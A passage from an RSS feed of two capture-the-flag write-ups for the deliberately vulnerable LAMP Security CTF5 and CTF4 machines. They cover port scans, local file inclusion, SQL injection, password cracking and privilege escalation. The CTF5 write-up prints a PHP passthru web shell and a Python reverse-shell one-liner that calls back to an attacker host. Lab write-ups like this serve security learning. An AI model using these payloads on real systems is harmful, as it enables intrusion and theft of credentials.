139/tcp  open  netbios-ssn Samba smbd 3.X – 4.X (workgroup: MYGROUP)
143/tcp  open  imap        University of Washington IMAP imapd 2006k.396 (time zone: -0400)
445/tcp  open  netbios-ssn Samba smbd 3.X – 4.X (workgroup: MYGROUP)
901/tcp  open  http        Samba SWAT administration server
3306/tcp open  mysql       MySQL 5.0.45
Device type: WAP|general purpose|media device|broadband router|PBX
Running (JUST GUESSING): Linux 2.4.X|2.6.X (95%), Sony embedded (95%), Starbridge Networks embedded (95%), Asus embedded (94%), Cisco embedded (94%)
OS CPE: cpe:/o:linux:linux_kernel:2.4.30 cpe:/o:linux:linux_kernel:2.6.27 cpe:/o:sony:smp-n200 cpe:/o:linux:linux_kernel:2.6 cpe:/h:starbridge_networks:1531 cpe:/h:asus:rt-ac66u cpe:/h:asus:rt-n16 cpe:/h:cisco:uc320
Aggressive OS guesses: OpenWrt White Russian 0.9 (Linux 2.4.30) (95%), Linux 2.6.27 (95%), Linux 2.6.9 – 2.6.27 (95%), Sony SMP-N200 media player (95%), Linux 2.6.21 (95%), Starbridge Networks 1531 wireless ASDL modem (95%), Linux 2.6.18 (95%), Tomato 1.28 (Linux 2.6.22) (95%), Asus RT-AC66U router (Linux 2.6) (94%), Asus RT-N16 WAP (Linux 2.6) (94%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 15 hops
Service Info: Hosts: localhost.localdomain, 10.66.4.100; OS: Unix
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.66 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;How we can see there were a lot of services, but first let’s see the website on port 80. I found a Local File Inclusion (LFI) Vulnerability:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Warning: include_once(inc/pagina.php.php) [function.include-once]: failed to open stream: No such file or directory in /var/www/html/index.php on line 6

Warning: include_once() [function.include]: Failed opening ‘inc/pagina.php.php’ for inclusion (include_path=’.:/usr/share/pear:/usr/share/php’) in /var/www/html/index.php on line 6
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The warning “include_once(inc/pagina.php.php)” helped me to understand I needed a null byte:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2016-12-20-lamp-security-ctf5-writeup/img1.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ok, I found a LFI but i needed to upload something for run code. On blog page there was this NanoCMS:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2016-12-20-lamp-security-ctf5-writeup/img2.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I found this &lt;a href=&quot;http://www.securityfocus.com/bid/34508&quot;&gt;vulnerability&lt;/a&gt; for NanoCMS (DirBuster found the same file):&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2016-12-20-lamp-security-ctf5-writeup/img3.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ok I got the username and password hash:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2016-12-20-lamp-security-ctf5-writeup/img4.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Authentication was successful, I created a new page containing a classic “&lt;?php passthru($_GET[“cmd”]); ?&gt;”:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2016-12-20-lamp-security-ctf5-writeup/img5.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I got a reverse shell on netcat by using this payload:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET, socket.SOCK_STREAM);s.connect((“10.0.0.1”,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”])
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After some local enumeration, I discovered that the OS was vulnerable to this &lt;a href=&quot;http://www.exploit-db.com/exploits/9479/&quot;&gt;exploit&lt;/a&gt;:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash-3.2# id
id
uid=0(root) gid=0(root) groups=48(apache) context=system_u:system_r:httpd_t:s0
bash-3.2# cat /passwd
cat /passwd
237709daa3a06bde0355ff93a9de0ca9
bash-3.2#
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;There were much interesting things in the system, for example:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;samba users enumeration&lt;/li&gt;
  &lt;li&gt;database credentials (LFI on configuration file of another blog)&lt;/li&gt;
  &lt;li&gt;database content:&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;+—–+———-+————+———————————-+
| uid | name | login | pass |
+—–+———-+————+———————————-+
| 0 | | 0 | |
| 1 | jennifer | 1241021410 | e3f4150c722e6376d87cd4d43fef0bc5 |
| 2 | patrick | 1475888924 | 5f4dcc3b5aa765d61d8327deb882cf99 |
| 3 | andy | 1241021903 | b64406d23d480b88fe71755b96998a51 |
| 4 | loren | 0 | 6c470dd4a0901d53f7ed677828b23cfd |
| 5 | amy | 0 | e5f0f20b92f7022779015774e90ce917 |
+—–+———-+————+———————————-+
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Bye bye!!!&lt;/p&gt;
</description>
        <pubDate>Tue, 20 Dec 2016 22:30:00 +0100</pubDate>
        <link>http://localhost:4000/blog/lamp-security-ctf5-writeup/</link>
        <guid isPermaLink="true">http://localhost:4000/blog/lamp-security-ctf5-writeup/</guid>
        
        <category>vulnhub</category>
        
        
        <category>blog</category>
        
      </item>
    
      <item>
        <title>Lamp Security CTF4 Writeup</title>
        <description>&lt;p&gt;Hi everyone. This is my solution for LAMP security CTF4. This CTF is very easy, you can download it from &lt;a href=&quot;https://vulnhub.com&quot;&gt;Vulnhub.com&lt;/a&gt; or play online on &lt;a href=&quot;https://root-me.org&quot;&gt;root-me.org&lt;/a&gt;. I did it on root-me, therefore my target was ctf07.root-me.org.&lt;/p&gt;

&lt;p&gt;Ok let’s start, i ran nmap to see which services were open (usually I run a second scan with “-p 1-65535” parameter to identify all the ports).&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Syrion:~ syrion$ sudo nmap -sT -sV -O ctf07.root-me.org
Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2016-10-07 21:19 CEST
Nmap scan report for ctf07.root-me.org (212.83.142.84)
Host is up (0.040s latency).
Not shown: 727 closed ports, 270 filtered ports
PORT STATE SERVICE VERSION
22/tcp open tcpwrapped
25/tcp open tcpwrapped
80/tcp open tcpwrapped
Device type: general purpose|WAP
Running (JUST GUESSING): OpenBSD 4.X (88%), Apple embedded (87%), FreeBSD 6.X (87%)
OS CPE: cpe:/o:openbsd:openbsd:4.0 cpe:/h:apple:airport_extreme cpe:/o:freebsd:freebsd:6.2
Aggressive OS guesses: OpenBSD 4.0 (88%), Apple AirPort Extreme WAP (87%), FreeBSD 6.2-RELEASE (87%), FreeBSD 6.3-RELEASE (87%), OpenBSD 4.3 (87%)
No exact OS matches for host (test conditions non-ideal).
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;At this point I used netcat to verify the services on the three open ports. As excepted:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;SSH on 22&lt;/li&gt;
  &lt;li&gt;SENDMAIL on 25&lt;/li&gt;
  &lt;li&gt;HTTP on 80&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;In the meantime,  I ran DirBuster, and I noticed this file:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2016-12-20-lamp-security-ctf4-writeup/img1.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It was the database’s structure:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2016-12-20-lamp-security-ctf4-writeup/img2.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This was the website on port 80:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2016-12-20-lamp-security-ctf4-writeup/img3.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I noticed this xss on the search bar:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2016-12-20-lamp-security-ctf4-writeup/img4.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Then I found an SQL Injection on the blog:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2016-12-20-lamp-security-ctf4-writeup/img5.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;

&lt;p&gt;At this pont I started to enumerate the select statement’s parameters by using this payloads:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;id=1 order by 1 —&lt;/li&gt;
  &lt;li&gt;id=1 order by 2 —&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;They were five!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2016-12-20-lamp-security-ctf4-writeup/img6.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I needed to know which parameters were visible:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2016-12-20-lamp-security-ctf4-writeup/img7.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And then I performed the full SQL Inection (i knew the database structure because of db.sql):&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2016-12-20-lamp-security-ctf4-writeup/img8.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ok let’s use &lt;a href=&quot;https://crackstation.net/&quot;&gt;crackstation&lt;/a&gt; to crack the hash. I tried to login as dstevens via ssh with the following credentials:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;username dstevens
password: ilike2surf
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And I succeeded:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Syrion:~ syrion$ ssh dstevens@ctf07.root-me.org
The authenticity of host ‘ctf07.root-me.org (212.83.142.84)’ can’t be established.
RSA key fingerprint is SHA256:NDWh6/414mOsW4P7K6ICc5R67PrX87ADMFUx9DK9ftk.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added ‘ctf07.root-me.org,212.83.142.84’ (RSA) to the list of known hosts.
BSD SSH 4.1
dstevens@ctf07.root-me.org’s password:
Last login: Mon Mar  9 07:48:18 2009 from 192.168.0.50
[dstevens@ctf ~]$
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I tried to run “sudo su” and yes… it worked (LOL):&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[dstevens@ctf ~]$ sudo su
Password:
[root@ctf dstevens]# id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel) context=user_u:system_r:unconfined_t:SystemLow-SystemHigh
[root@ctf dstevens]# cat /passwd
8cfd7e1715e7957021b5aa23f7839131
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The privilege escalation was very very…very easy 😛&lt;/p&gt;

&lt;p&gt;Bye bye!&lt;/p&gt;
</description>
        <pubDate>Tue, 20 Dec 2016 22:00:00 +0100</pubDate>
        <link>http://localhost:4000/blog/lamp-security-ctf4-writeup/</link>
        <guid isPermaLink="true">http://localhost:4000/blog/lamp-security-ctf4-writeup/</guid>
        
        <category>vulnhub</category>
        
        
        <category>blog</category>
        
      </item>
    
  </channel>
</rss>
